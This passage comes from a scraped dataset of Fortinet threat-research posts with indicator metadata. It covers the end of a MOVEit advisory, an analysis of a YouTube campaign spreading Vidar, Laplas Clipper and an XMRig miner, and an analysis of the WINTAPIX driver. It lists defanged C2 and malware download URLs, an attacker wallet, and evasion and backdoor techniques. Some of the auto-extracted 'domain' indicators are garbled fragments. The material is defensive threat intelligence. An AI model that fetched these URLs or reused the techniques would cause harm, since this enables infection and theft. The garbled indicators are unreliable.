further details. Yes,the vendor advisorycontains mitigation that can be applied before applying the vendor patch. CVE-2023-34362 has allegedly been leveraged by the Cl0p ransomware threat actor to compromise multiple organizations for data exfiltration and other malicious activities. Now that the vulnerability has gained public attention, we expect other threat actors to also leverage this vulnerability, and new attempts at exploitation will likely be accelerated. As such, FortiGuard Labs strongly urges MOVEit Transfer users to apply all patches and implement mitigations provided by the vendor as soon as possible. FortiGuard Labs will continue to actively monitor the situation for further insights and provide additional information about protections as they become available. 702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0 web shell backdoor 929bf317a41b187cf17f6958c5364f9c5352003edca78a75ee33b43894876c62 web shell backdoor c77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37 web shell backdoor 93137272f3654d56b9ce63bec2e40dd816c82fb6bad9985bed477f17999a47db web shell backdoor bdd4fa8e97e5e6eaaac8d6178f1cf4c324b9c59fc276fd6b368e811b327ccf8b web shell backdoor d49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195 web shell backdoor 348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d web shell backdoor 769f77aace5eed4717c7d3142989b53bd5bac9297a6e11b2c588c3989b397e6b web shell backdoor 7c39499dd3b0b283b242f7b7996205a9b3cf8bd5c943ef6766992204d46ec5f1 web shell backdoor 3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b web shell backdoor b9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad web shell backdoor 4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf web shell backdoor daaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4 web shell backdoor a1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7 web shell backdoor f0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d web shell backdoor ea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a web shell backdoor cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45 web shell backdoor 5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff web shell backdoor 0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495 web shell backdoor 387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a web shell backdoor 3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409 web shell backdoor c56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4 web shell backdoor fe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2f web shell backdoor 9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead web shell backdoor 9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a web shell backdoor b1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272 web shell backdoor 6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d web shell backdoor 48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a web shell backdoor 2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5 web shell backdoor e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e web shell backdoor d477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899 web shell backdoor 3c0dbda8a5500367c22ca224919bfc87d725d890756222c8066933286f26494c web shell backdoor Learn more about Fortinet’sFortiGuard Labsthreat research and global intelligence organization and Fortinet’s FortiGuard AI-powered Security Servicesportfolio. Sign upto receive our threat research blogs. vulnerabilities,zero-day vulnerability FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/moveit-transfer-critical-vulnerability-cve-2023-34362-exploited-as-a-0-day",
      "scraped_at": "2025-07-20T13:56:23.701376",
      "indicators": {
        "ip_address": [
          "127.0.0.1"
        ],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495",
          "387cee566aedbafa8c114ed1c6b98d8b9b65e9f178cf2f6ae2f5ac441082747a",
          "6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d",
          "769f77aace5eed4717c7d3142989b53bd5bac9297a6e11b2c588c3989b397e6b",
          "fe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2f",
          "bdd4fa8e97e5e6eaaac8d6178f1cf4c324b9c59fc276fd6b368e811b327ccf8b",
          "3ab73ea9aebf271e5f3ed701286701d0be688bf7ad4fb276cb4fbe35c8af8409",
          "a1269294254e958e0e58fc0fe887ebbc4201d5c266557f09c3f37542bd6d53d7",
          "9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a",
          "d477ec94e522b8d741f46b2c00291da05c72d21c359244ccb1c211c12b635899",
          "c77438e8657518221613fbce451c664a75f05beea2184a3ae67f30ea71d34f37",
          "3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b",
          "4359aead416b1b2df8ad9e53c497806403a2253b7e13c03317fc08ad3b0b95bf",
          "93137272f3654d56b9ce63bec2e40dd816c82fb6bad9985bed477f17999a47db",
          "daaa102d82550f97642887514093c98ccd51735e025995c2cc14718330a856f4",
          "e8012a15b6f6b404a33f293205b602ece486d01337b8b3ec331cd99ccadb562e",
          "f0d85b65b9f6942c75271209138ab24a73da29a06bc6cc4faeddcb825058c09d",
          "702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0",
          "348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d",
          "b1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272",
          "5b566de1aa4b2f79f579cdac6283b33e98fdc8c1cfa6211a787f8156848d67ff",
          "3c0dbda8a5500367c22ca224919bfc87d725d890756222c8066933286f26494c",
          "9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead",
          "2413b5d0750c23b07999ec33a5b4930be224b661aaf290a0118db803f31acbc5",
          "b9a0baf82feb08e42fa6ca53e9ec379e79fbe8362a7dac6150eb39c2d33d94ad",
          "cf23ea0d63b4c4c348865cefd70c35727ea8c82ba86d56635e488d816e60ea45",
          "ea433739fb708f5d25c937925e499c8d2228bf245653ee89a6f3d26a5fd00b7a",
          "c56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4",
          "d49cf23d83b2743c573ba383bf6f3c28da41ac5f745cde41ef8cd1344528c195",
          "929bf317a41b187cf17f6958c5364f9c5352003edca78a75ee33b43894876c62",
          "48367d94ccb4411f15d7ef9c455c92125f3ad812f2363c4d2e949ce1b615429a",
          "7c39499dd3b0b283b242f7b7996205a9b3cf8bd5c943ef6766992204d46ec5f1"
        ],
        "cve": [
          "CVE-2023-34362",
          "CVE-2023-34462"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 1.2876254180602007
    }
  },
  {
    "id": "Fortinet_54401",
    "source": "Fortinet",
    "title": "YouTube Pirated Software Videos Deliver Triple Threat: Vidar Stealer, Laplas Clipper, XMRig Miner",
    "text": "FortiGuard Labs Threat Research Affected Platforms:WindowsImpacted Users:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrency and perform cryptojacking on systemsSeverity Level:Critical FortiGuard Labs came across an ongoing threat campaign targeting YouTube viewers searching for pirated software earlier this month. Videos advertising downloads of “cracked” (aka pirated) software are uploaded by verified YouTube channels with a large number of subscribers. Victims are led to execute malicious binaries that install multiple malware into their systems focused on harvesting credentials, cryptojacking, and stealing cryptocurrency funds from wallets. While investigating this campaign,other researcherspublished a report about it. And although there are overlaps with our findings, this report provides additional observations, such as the deployment of a third malware family being distributed to the victims. This article describes the entire attack chain and technical details on the malware components that make up this campaign. The uploaded videos lure users searching for pirated software by using titles such as “Adobe Acrobat Pro dc Crack 2023 free full version / Adobe Acrobat Free Download”. Some videos display tutorials for using the pirated software, although in most cases, they simply display static images often unrelated to the software product (Figure 1). For more credibility, the malware campaign utilizes verified YouTube channels withlarge numbers of followers. In fact, one of the YouTube channels observed hasnearly 3 million subscribers (Figure 2). As these YouTube channels have uploaded legitimate videos in the past, we suspect these accounts may have been compromised. Similar comments (likely auto-generated) were posted for some of the videos, which suggests the possibility of an automated video uploading and commenting process (Figure 3). Potential victims are led to download a password-protected archive from a file-sharing service. The malicious URLs and passwords (usually four numeric digits) are located in the video’s description and the comments section (Figure 4). The videos seem to be uploaded in batches. For instance, one of the accounts uploaded over 50 videos within eight hours, offering different pirated software that all led to the same URL. The videos are deleted after some time, after which the threat actors upload the videos to other accounts. As shown in Figure 5, after downloading the RAR archive2O23-F1LES-S0ft.rarvia the URL provided in the YouTube video description, the victim must uncompress the archive with the password “1212,” listed together with the URL, and run theLauncher_S0FT-2O23.execontained within. The archive also contains multiple unused files and directories, possibly to masquerade as a legitimate installer. A detailed analysis of each component is provided in the following sections. Launcher_S0FT-2O23.exeis the Vidar infostealer. It is appended with over 1GB of unused bytes, a technique commonly used to bypass antivirus and sandboxes that do not scan files beyond a specific size due to limited CPU and RAM resources. The SHA256 hash of this file is820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c(original) ande256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb(after removing excess bytes). Once executed, it sends an HTTP GET request to its Command and Control (C2) server at 79.137.206[.]228 to check in and retrieve the stealer configuration (Figure 6). Note the absence of User-Agent and other typical HTTP headers in this GET request. The semicolon delimited configuration can be interpreted as follows: Based on this configuration, this stealer will collect passwords stored locally (e.g., FTP, SSH), browser cookies and history, Telegram data, and screenshots. Cryptocurrency wallet collection is not enabled. Once the sensitive information has been collected and compressed into a ZIP file, the malware will exfiltrate this data to the C2 via an HTTP POST request (Figure 7). The POST request contains“id”,which represents the stealer and is the same for every infected user, and a “token” previously provided by the C2 server in the check-in request. The“file”contains a Base64-encoded ZIP file with the data collected by the malware. Figure 8 shows the contents of the ZIP file. Information.txt includes information on the OS, hardware, running processes, and installed software on the infected system (Figure 9). The C2 server then responds with a list of secondary payloads for the malware to download and execute (Figure 10). This sample downloads files stored as releases in GitHub repositories owned by the userjesus061031r. Similar malicious files with different filenames are scattered among other repositories owned by the same user. These files are written to%ProgramData%with randomized filenames containing 20 numeric characters and are executed sequentially. Once the payloads are executed, the malware exits and deletes itself. Analyses of the payloads are discussed in the following sections. This sample was identified as Vidar Stealer based on the C2 protocol, the system data format ininformation.txt,and the organization of the files in the exfiltrated ZIP. While Vidar is a distinctly different malware family from RecordBreaker observed by other researchers tracking the same campaign, both are infostealers, which indicates the threat actor’s primary interest in stealing credentials to further their malicious objectives. GUI_MODERNISTA.exe (SHA256:62d4caf908b3645281d5f3c0f5b5dc3a4beb410015196f7eaf66ca743f415668) is a relatively small (48KB) . NET application that redirects users to hardcoded URL links to files on file-sharing sites containing the purportedly cracked (and illegal) versions of software, as advertised by the YouTube video. This is the only component displayed to the victim, as the other components of the attack chain run covertly in the background. During our research, we also collected a Python version (SHA256:ba9503b78bc62d4e5e22e4f8e04b28bb6179e146e1c0a6ba14dd06608facb481) of this application. The UI of both versions is shown in Figure 11. Vadwax.exe(SHA256:f91d9de259052595946250a1440a2457dbda9ee8aec8add24419ff939f13e003) is 1.17 GB in size but comprised mainly of an overlay of the repeating bytes 0x30, which corresponds to “0” in ASCII (Figure 12). After removing the unused overlay, we ended up with a much smaller 5.87 MB file (SHA256:2fcb61da34b259b9b130c0c75525697931b9dff8e7f9b2198f9db21b5193eeba). Like the earlier sample, this artificial inflation is used to circumvent AV solutions. This sample is Laplas Clipper, which attempts to substitute wallet addresses in the user’s clipboard to steal cryptocurrency. It constantly checks the content of the Windows clipboard against regular expressions retrieved from the C2 server. Upon a match, the content of the clipboard is sent to the C2 server, which responds with the threat actor’s wallet address for the appropriate cryptocurrency for replacement. This enables Laplas Clipper to switch the original payee’s wallet address with the threat actor’s and divert the funds to the threat actor instead. This particular sample is protected by the commercial VMProtect packer with heavy use of anti-sandbox and anti-analysis checks. As Laplas Clipper has been described by other researchers, we will just focus on the persistence and C2 communication of this sample. Persistence: This sample checks to see if it is being run from the%Appdata%directory. If not, it copies itself at%Appdata%\\telemetry\\svcservice.exeand appends an overlay containing randomized bytes to the file. It then maintains persistence by adding a registry value namedtelemetryto the following key: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Communication: Laplas Clipper first registers with the C2 server using the current machine name and Windows username (guidparameter) and a 64-character hexadecimal string (keyparameter) via an HTTP GET request tohxxp://85[.]192[.]40[.]252/bot/online?guid=<machine name>/<username>&key=<hexadecimal string> After successfully registering with the C2 server, it requests regular expressions fromhxxp://85[.]192[.]40[.]252/bot/regex(Figure 13). The regular expressions hunt for the addresses of the following cryptocurrencies in the clipboard (ordered alphabetically): Incidentally, the Laplas Clipper C2 panel at laplas[.]app resolves to 85[.]192[.]40[.]252 (Figure 14). Vaxa.exe (SHA256:44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f) is an in-memory loader for an embedded miner downloader payload. It is a 32-bit Windows console application masquerading as a program for performing and displaying the results of some simple math operations (Figure 15). It then proceeds to decrypt the shellcode and payload from its body. The shellcode is provided with the path of the application to inject the payload into before execution is redirected to it (Figure 16). The shellcode uses process hollowing to inject and execute a . NET assembly namedTask32Main(SHA256:5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3) within Regsvcs.exe. Task32Main – Miner Downloader Task32Mainis a . NET downloader and installer for Monero cryptomining components. It provides supporting functionality, such as maintaining persistence and AV evasion. More importantly, it is responsible for installing the watchdog component, which ensures that the miner is kept running in the victim system. To avoid being detected, it executes encoded PowerShell commands to add the following to the directories on the Windows Defender's scanning exclusion list: It then downloads a configuration file fromhxxps://pastebin[.]com/raw/5p5KkdBwto download other malware payloads and their execution parameters (Figure 17). A modified copy of this configuration is written aslog.uceto the following directories: This will be used as the configuration file for the watchdog component discussed in the next section. The above configuration instructs the malware to download additional cryptomining-related payloads from the following URLs: The malware creates the directory%ProgramData%\\Dllhostand saves the downloaded files asdllhost.exe(miner watchdog) andwinlogson.exe(Monero XMRig miner), respectively. The malware then modifies the directory’s permissions to deny access to the current user. To persist in the victim system, it then adds several scheduled tasks to execute the watchdogdllhost.exeevery hour. It does this by executing the following command: The scheduled task names impersonate legitimate Windows-related software to deter casual detection and are as follows: It also changes the power settings of the system to prevent it from hibernating and sleeping by executing the following command to ensure that its Monero cryptominer component (executed later) is always running while the machine is powered up: The host file is also modified to resolve security product-related domains to the IP 0.0.0.0 to disable communication by security products, e.g., for downloading updates. Lastly, it executes the watchdog component%ProgramData%\\dllhost.exe, which executes the actual cryptominer. Dllhost.exe - Miner watchdog Dllhost.exe(SHA256:d2e371810e8c7b1e039a02a578b1af0c6250665e85206b97a1ecb71aa5568443) is a . NET assembly namedTask32Watch. It is a watchdog application that executes the miner component, monitors its process, and ensures it is kept running and uses the latest mining parameters. It reads its own configuration file,log.uce, previously dropped by the installer componentTask32Main. It has the same content as the configuration file downloaded by theTask32Maincomponent, excluding the first three lines. Moreover, it includes the Pastebin URL where the configuration file was downloaded as the last line. This Pastebin URL allows the watchdog to retrieve the latest XMRig mining parameters (e.g., mining pool server, wallet address, worker name “snnssnewte”, etc.). It then executes the miner winlogson.exe located in the same directory with these mining parameters. As a watchdog, it ensures that the miner process is always running by constantly enumerating the processes currently running in the system and then re-running the miner if it is terminated. In addition, to lessen the chance of getting discovered and being terminated by the user, it kills processes related to system diagnostics and analysis tools, such as Task Manager and Process Hacker. Lastly, it also ends games-related processes, which are usually resource-intensive and reduce the CPU resources available for mining. This campaign highlights the dangers of downloading illegally pirated copies of software because of the tendency of threat actors to prey on such users to steal credentials, sensitive data, or even cryptocurrency. On top of this, the infected machine is also used for cryptojacking to mine Monero for the threat actor. The agility of these threat actors is also a cause for concern, as we observed the threat actor behind this campaign rapidly uploading new copies of similar malware whenever GitHub takes down the malicious repositories. FortiGuard Labs will continue to monitor and report on updates to this threat campaign. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. FortiGuard Labs provides IPS signatures to detect malware traffic. The FortiGuard Web Filtering Service blocks the C2 servers and download URLs. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources., MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contactourGlobal FortiGuard Incident Response Team. 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb 62d4caf908b3645281d5f3c0f5b5dc3a4beb410015196f7eaf66ca743f415668 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f f91d9de259052595946250a1440a2457dbda9ee8aec8add24419ff939f13e003 2fcb61da34b259b9b130c0c75525697931b9dff8e7f9b2198f9db21b5193eeba d2e371810e8c7b1e039a02a578b1af0c6250665e85206b97a1ecb71aa5568443 21bc43587dc1f19ec6271e69fe709b18fdefdfbfc5971a3edf00e92cb1b77995 a0ac98bbd611fc697133ab872f9d978dc1931ea70f8a2374d18aff5754f7c110 ba9503b78bc62d4e5e22e4f8e04b28bb6179e146e1c0a6ba14dd06608facb481 9c5aff1352619f14feb736916374bbed06ef41a7d0cb72d789cb86e8f3906212 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3 Download URLs hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/2O23-F1LES-S0ft.rar hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vadwax.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/GUI_MODERNISTA.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/exep.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vaxa.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vdsc.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vdscs.exe hxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/xmrig.exe hxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/WatchNew.exe hxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/lolMiner.exe hxxps://github[.]com/bonniebosidaw/bolikgs/releases/download/voollik/2O23-F1LES-S0ft.rar hxxps://pastebin[.]com/raw/5p5KkdBw 79.137.206[.]228 (Vidar C2) 85.192.40[.]252 (Laplas Clipper C2) Monero Wallet Address 48GSRPwCNzLCkNGCMgUsqfg8BxJq8azyUbMLQM4Dvqh64M8goBjQ2SkVFUokVDzQpqfotv1oDcB8X8qMxuLK6GDBSWU3tp4 youtube,cryptojacking FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/youtube-pirated-software-videos-deliver-triple-threat-vidar-stealer-laplas-clipper-xmrig-miner",
      "scraped_at": "2025-07-20T13:56:31.685485",
      "indicators": {
        "ip_address": [
          "0.0.0.0"
        ],
        "domain": [
          "nformation",
          "ninformation",
          "sdllhost",
          "egsvcs",
          "olMiner",
          "adwax",
          "og",
          "xep",
          "ndwinlogson",
          "llhost",
          "dsc",
          "O23",
          "axa",
          "vcservice",
          "inlogson",
          "atchNew",
          "rchive2O23-F1LES-S0ft",
          "atchdogdllhost",
          "dscs",
          "O23-F1LES-S0ft",
          "mrig",
          "slog"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c",
          "a0ac98bbd611fc697133ab872f9d978dc1931ea70f8a2374d18aff5754f7c110",
          "5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3",
          "21bc43587dc1f19ec6271e69fe709b18fdefdfbfc5971a3edf00e92cb1b77995",
          "62d4caf908b3645281d5f3c0f5b5dc3a4beb410015196f7eaf66ca743f415668",
          "d2e371810e8c7b1e039a02a578b1af0c6250665e85206b97a1ecb71aa5568443",
          "e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb",
          "f91d9de259052595946250a1440a2457dbda9ee8aec8add24419ff939f13e003",
          "2fcb61da34b259b9b130c0c75525697931b9dff8e7f9b2198f9db21b5193eeba",
          "9c5aff1352619f14feb736916374bbed06ef41a7d0cb72d789cb86e8f3906212",
          "44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f",
          "ba9503b78bc62d4e5e22e4f8e04b28bb6179e146e1c0a6ba14dd06608facb481"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.5345757724374693
    }
  },
  {
    "id": "Fortinet_29729",
    "source": "Fortinet",
    "title": "WINTAPIX: A New Kernel Driver Targeting Countries in The Middle East",
    "text": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:Allows remote code execution and persistent access to the host (backdoor) and the rest of the network (proxy)Severity level:Medium At Fortinet, we monitor suspicious executables that make use of open-source tools and frameworks. One of the things that we keep an eye out for is tools that use theDonutproject. Donut is a position-independent shellcode that loads . NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. During our daily threat-hunting process in early February, we encountered a kernel driver that used the Donut tool and caught our attention for further analysis. The sample that triggered our rule was a driver called WinTapix.sys (which is why we named it WINTAPIX). Since it uses Donut, we decided to analyze it further. It turned out to be a very interesting sample that we believe is being used in targeted attacks against countries in the Middle East. This captured sample was compiled in May 2020 but was only uploaded to Virus Total in February of this year. Pivoting from this sample, we found another variant of this driver with the same name that was compiled around the same time, but it was uploaded to Virus Total in September 2022. Pivoting again from the used certificates, we found another variant of the WINTAPIX driver with the SRVNET2. SYS name. This sample was compiled in June 2021 and was first observed in the wild in December 2021. Based on the information we have collected so far, we now believe that this driver has been active in the wild since at least mid-2020 and, to the best of our knowledge, has not been reported before. Observed telemetry shows that 65% of the lookups for this driver were from Saudi Arabia, indicating it was a primary target. This same telemetry shows a considerable increase in the number of lookups for this driver in August and September 2022 and again in February and March 2023. This may indicate that the actor(s) behind this driver was operating major campaigns on these dates. However, we still do not have enough information about how this driver has been distributed and who was behind these operations. Based on the victimology, we suspect an Iranian threat actor developed this driver. Observed telemetry shows that while this driver has primarily targeted Saudi Arabia, it has also been detected in Jordan, Qatar, and the United Arab Emirates, which are the classic targets of Iranian threat actors. Since Iranian threat actors are known to exploit Exchange servers to deploy additional malware, it is also possible that this driver has been employed alongside Exchange attacks. To that point, the compilation time of the drivers is also aligned with times when Iranian threat actors were exploiting Exchange server vulnerabilities. The attribution process of this driver is still ongoing, and we will provide additional info when we have a better idea about the identity of the threat actor or group. In this blog post, we provide a comprehensive analysis of this driver. We analyzed the sample with the SHA-256 hash of 8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330, also known as Wintapix.sys. As the file extension suggests, this is a Windows Kernel Driver. Figure 1 shows some of its attributes. Its digital signature is invalid, meaning the threat actor might first need to load a vulnerable (but legitimate) driver and exploit that to load the Wintapix.sys. But once the driver is loaded, the following execution chain runs: We will look at these artifacts in more detail in the rest of the analysis. Wintapix.sys is partially protected by VMProtect, a software protection tool that uses virtualization to protect software applications from reverse engineering and unauthorized usage. It transforms the original executable file into a virtualized code executed in a protected environment, making it difficult to analyze and tamper with. However, not all functions in the driver are protected, including the code that creates the next stage of the attack, which is the focus of the analysis. Wintapix.sys is essentially a loader. Thus, its primary purpose is to produce and execute the next stage of the attack. This is done using a shellcode. Interestingly, the shellcode (Figure 3) is hardcoded in the binary without any obfuscation. This defeats the purpose of protecting most of the binary with VMProtect since most Anti-Virus engines can identify the embedded shellcode. To inject the shellcode, the driver must first find a suitable target process. The requirements for the target process are as follows: Once a suitable process is found, it is opened with ZwOpenProcess(), and memory is allocated in the target process’s memory with ZwAllocateVirtualMemory(). Finally, NtWriteVirtualMemory() injects the embedded shellcode into the target process (Figure 5). The address of NtWriteVirtualMemory() is recovered in runtime, helping to hide the function call from static analyzers. Another important function of Wintapix.sys is to set up persistence. This is first done by creating register keys at the following places: Interestingly, the driver is set to load in Safe Boot. Safe Boot, also known as Safe Mode, is a diagnostic startup mode in Windows that launches the system with minimal drivers and services. It is designed to help users troubleshoot and resolve software or driver-related issues that might prevent the system from starting normally. Loading the driver in Safe Boot also adds another layer of persistence to the mix. All created registry keys are monitored using the ZwNotifyChangeKey(). This Windows kernel-mode function allows monitoring changes to a specified registry key. The function notifies the caller of any changes to the registry key by signaling the event or invoking the APC (asynchronous procedure call) routine. This makes it useful for applications that need to react to registry modifications in real time. This allows the malware to reset itself in the registry after it has been removed. It also starts a new thread with PsCreateSystemThread() to monitor the file location of Wintapix.sys. It uses NtNotifyChangeDirectoryFile() to monitor changes in the file. Should Wintapix.sys be deleted, it will write it back to the same location. Fortunately, the embedded shellcode can be dumped from Wintapix.sys and analyzed separately. It quickly revealed that the shellcode was created using the Donut project. Donut allows you to convert any . NET assembly or shellcode file into position-independent shellcode, which can then be injected into a target process using techniques like process hollowing or thread hijacking. The generated shellcode is self-contained and does not rely on any external dependencies. This means that the primary goal in our analysis should be to extract the next attack stage, which should be a . NET assembly. The . NET payload can be extracted from the Donut shellcode by identifying and breaking the decryption function in a debugger. After decryption runs, the . NET assembly can be dumped from memory. Once the payload is saved into a file, we analyzed it as a stand-alone . NET executable. Of course, one of the advantages of . NET binaries (from a reverse engineering point of view) is that they can be easily decompiled into source code. This, of course, is a tremendous help in understanding the binary’s goals and capabilities. Detect It Easy (Figure 8), however, tells us that this executable has been protected by multiple obfuscators, particularly Smart Assembly and Eazfuscator. Because of this, the deobfuscator tools did not help much, and we just had to live with the challenge. The program's main function first decodes two arrays using the GetListUrls() function (Figure 9), suggesting that the results contain URLs. The array called ‘input’ contains the following decoded values: \"accidents_\" \"aspnet_client_\" \"js_search-\" \"lookup_data-\" \"mng_data_bank_\" \"transactions-\" \"trn_fitness-\" \"_omrvision\" \"user_accounts-\" \"violation-\" \"_program_steps\" \"workflow-\" The array called ‘input2’ contains the following values: \"programs_skill_\" \"competences-\" \"properties_\" \"evaluation-\" \"expert_data_\" \"_expert_form\" \"_employee\" These values are used to construct URLs. However, the malware is looking for Microsoft Internet Information Services (IIS) characteristics to build them. This means that this malware only targets IIS servers. On machines without IIS installed, it will simply crash. Given the IIS characteristics shown in Figure 10, the malware extracts the sites hosted by the IIS server. And using that and the strings listed above, it constructs a list of URL templates that it will listen on. These URL lists are used in the two main functionalities of the payload: The list named ‘input2’ is used for the backdoor functionality. It starts an HTTP listener on these URLs and uses the Program. HandleRequest() function to handle any incoming requests, which then refers to RequestHandler. Execute()(Figure 11). Let’s start from the end. If the incoming request contains the string ‘wOxhuoSBgpGcnLQZxipa’, then the string ‘UsEPTIkCRUwarKZfRnyjcG13DFA’ is sent back. This seems to be a kind of heartbeat implementation. If the request has a ‘Jet’ or ‘<space>Ver’ parameter, their values are base64-decoded and used to build a command using cmd /c <command>. This is then passed to the RunCommand() function, which executes them with Process.start(). Their output will be sent back in the response to the request. And finally, if the request has a body, then the RunData() function (Figure 12) is called. RunData() decrypts the body of the request and, depending on the message type, implements the following actions: Encryption is implemented for both incoming and outgoing messages. The attribute PrivateKey (Figure 13) suggests that it implements some kind of asymmetric encryption algorithm. However, after looking further into the code, we discovered that calling it a ‘PrivateKey’ is just an exaggeration. In reality, there is nothing asymmetric about it, the program implements a simple XOR encoding (Figure 14) as decryption and encryption using the ‘PrivateKey’ as a key. The values from the list ‘input’ are used to start proxy listeners with Proxy. HandleRequest() on those URLs. This part of the program can handle a variety of data streams. If it’s just data, it will act as a simple proxy, sending and receiving data between the two sides of the proxy. However, it can also accept RDP configuration data (Figure 15). Using this RDP data, it can open a connection to the target RPD server and proxy it to the threat actor. This blog provided a detailed analysis of a driver named WinTapix, which we identified in early Feb of this year. The driver uses a Donut open-source payload to inject its shell code. It seems to be primarily targeting Saudi Arabia. The attribution process of this driver is still ongoing, but based on the victims, we assess with low confidence that this is a work of an Iranian threat actor. Fortinet customers are already protected from these APT and cyber-crime campaigns through FortiGuard’s AntiVirus, FortiMail, and FortiClient services, as follows: The following (AV) signatures detect the malicious documents mentioned in this blog: W32/PossibleThreatW64/AI. Native. Suspicious. AVENW32/GenCBL. BAK!tr FortiEDR natively detects and blocks the malicious executables identified in the report based on their behavior. The following image shows how FortiEDR detects the suspicious driver load and flags the driver as malicious. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. SRVNET2. SYS f6c316e2385f2694d47e936b0ac4bc9b55e279d530dd5e805f0d963cb47c3c0d WinTapix.sys 1485c0ed3e875cbdfc6786a5bd26d18ea9d31727deb8df290a1c00c780419a4e WinTapix.sys 8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330 